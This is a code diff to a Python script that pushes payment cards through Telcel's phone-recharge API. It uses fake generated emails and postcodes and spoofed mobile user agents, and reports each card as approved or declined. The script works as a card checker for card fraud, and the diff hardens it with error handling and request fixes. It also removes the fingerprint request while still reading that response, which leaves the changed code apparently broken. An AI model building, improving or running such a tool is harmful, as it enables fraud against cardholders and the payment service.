@@ -47,6 +47,13 @@ fake = Faker("es_MX")
 get_ua = lambda: UserAgent(platforms='mobile').random
 email = lambda: f"{fake.user_name()}@{random.choice(["gmail.com", "yahoo.com", "live.mx", "outlook.com"])}"
 post_code = random.randint(10000, 16999)
+
+def _json(res: requests.Response):
+    try:
+        return res.json()
+    except (ValueError, json.JSONDecodeError):
+        return {}
+
 #Funcion principal
 def main(ccs, monto, num):
     with requests.Session() as session:
@@ -79,31 +86,32 @@ def main(ccs, monto, num):
                 "priority": "u=1, i", 
                 "uzlc": "7f9000bcd84e79-07b8-4fbc-97e2-11abf7e275141-17697602171230-0020155235292a387ba1010160219141uPvSx3ffcf1dd8",
             }
-            print(headers)
-            res = session.post("https://paymentservice.telcel.com/api/services/payment/getFingerPrint", headers=headers)
-            print(res.text)
-            sessionid = res.json().get("sessionId")
-            web_sess = res.json().get("webSession")
+            _j = _json(res)
+            sessionid = _j.get("sessionId")
+            web_sess = _j.get("webSession")
             headers = {"sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}",  "sec-ch-ua-mobile": "?1",  "user-agent": ua, "accept": "application/json, text/plain, */*", "content-type": "application/json", "sec-gpc": "1", "accept-language": "es-MX,es;q=0.6",  "origin": "https://paymentservice.telcel.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://paymentservice.telcel.com/payments/", "accept-encoding": "gzip, deflate, br, zstd", "priority": "u=1, i"}
             encDta= build(ccs); numc=encDta.get("token", ""); cvv=encDta.get("cvv", "");type=encDta.get('type','')
             resultm = get_montos(int(monto))
             if not resultm:
                 return {"number": num, "monto": monto, "status": "Error ⚠️", "message": f"Monto inválido: selecciona un monto válido (20, 30, 50, 80, 100, 150, 200, 300, 500)"}
-            data ={"isAuth": False, "service": { "type": "RECARGA", "operationType": 2, "productType": 1, "planType": 1, "productCode": "", "mdn": num,"region": 5,  "tipoPerfil": "AMIGO", "planName": "RECARGA_SALDO", "price": int(monto),  "idproduct": resultm["key_id"], "validity": resultm["vigencia"] }, "accountId": None,"email": email(),"fingerprint": { "organizationId": "gp9h38j0", "sessionId": sessionid, "webSession": web_sess }, "postalCode": post_code,"isSavedCard": False,"cardType": type,"tokenCard": numc,"lastDigits": ccs[12:-12]}
+            data ={"isAuth": False, "service": { "type": "RECARGA", "operationType": 2, "productType": 1, "planType": 1, "productCode": "", "mdn": num,"region": 5,  "tipoPerfil": "AMIGO", "planName": "RECARGA_SALDO", "price": int(monto),  "idproduct": resultm["key_id"], "validity": resultm["vigencia"] }, "accountId": None,"email": email(),"fingerprint": { "organizationId": "gp9h38j0", "sessionId": sessionid, "webSession": web_sess }, "postalCode": post_code,"isSavedCard": False,"cardType": type,"tokenCard": numc,"lastDigits": ccs.split("|")[0][-4:]}
             res = session.post("https://paymentservice.telcel.com/api/services/recharge/prepareOrder", headers=headers, json=data)
             if "paymentId" in res.text:
-                paymentid=res.json().get("paymentId")
+                paymentid=_json(res).get("paymentId")
+            else:
+                return {"number": num, "monto": monto, "status": "Declined ❌", "message": res.text[:200], "card": ccs.strip(), "status_resp": res.status_code}
             headers = { "sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}", "sec-ch-ua-mobile": "?1", "user-agent": ua,"accept": "application/json, text/plain, */*", "content-type": "application/json","sec-gpc": "1", "accept-language": "es-MX,es;q=0.6", "origin": "https://paymentservice.telcel.com", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors","sec-fetch-dest": "empty",  "referer": "https://paymentservice.telcel.com/payments/"}
-            data = {"generalInfo": {"mdn": num, "encryptedCvv": cvv, "userName": ""}, "vestaRequest": { "organizationId": "gp9h38j0","sessionKey": sessionid, "webSessionId": web_sess, "isRecurring": False}}
+            data = {"generalInfo": {"mdn": num, "encryptedCvv": cvv, "userName": ""}, "vestaRequest": { "organizationId": "gp9h38j0","sessionKey": sessionid, "webSessionId": web_sess, "isRecurring": False}, "paymentId": paymentid}
             res = session.post("https://paymentservice.telcel.com/api/services/recharge/confirmOrder", headers=headers, json=data, allow_redirects=False)
             resp_text = res.text
             if "TRANSACCION_EXITOSA" in resp_text or "folioMotor" in resp_text or "folioTelcel" in resp_text or "operationDate" in resp_text:
-                datas=res.json();ftc=datas.get("folioTelcel", "Null");ftm=datas.get("folioMotor", "Null");provee = datas.get("provider", "FONYOU")
+                datas=_json(res);ftc=datas.get("folioTelcel", "Null");ftm=datas.get("folioMotor", "Null");provee = datas.get("provider", "FONYOU")
                 return {"number": num, "monto": monto, "status": "Approved ✅", "message": "Recarga exitosa", "folio_telcel": ftc, "folio_motor":ftm, "proveedor": provee, "card": ccs.strip()}
             elif "FONDOS_INSUFICIENTES" in resp_text:
-                return  {"number": num, "monto": monto, "status": "Declined ❌", "description": res.json().get("message", "Declined ❌"), "card": ccs.strip()}
+                return  {"number": num, "monto": monto, "status": "Declined ❌", "description": _json(res).get("message", "Declined ❌"), "card": ccs.strip()}
             elif "La transacción fue rechazada por el banco." in resp_text or "Lamentamos el inconveniente, por favor," in resp_text or "RECHAZO_BANCARIO" in resp_text:
-                dm = "Recarga no enviada por error en cargo" if "Código de rechazo en respuesta (01) del mensaje tipo: 01: id: N/A" in res.json().get("description", "Declined ❌") else res.json().get("description", "Declined ❌")
+                _j = _json(res)
+                dm = "Recarga no enviada por error en cargo" if "Código de rechazo en respuesta (01) del mensaje tipo: 01: id: N/A" in _j.get("description", "Declined ❌") else _j.get("message", "Declined ❌")
                 return {"number": num, "monto": monto, "status": "Declined ❌", "message": dm, "card": ccs.strip()}
             else:
                 return {"number": num, "monto": monto, "status": "Declined ❌", "message": resp_text[:200], "card": ccs.strip(), "status_resp": res.status_code}
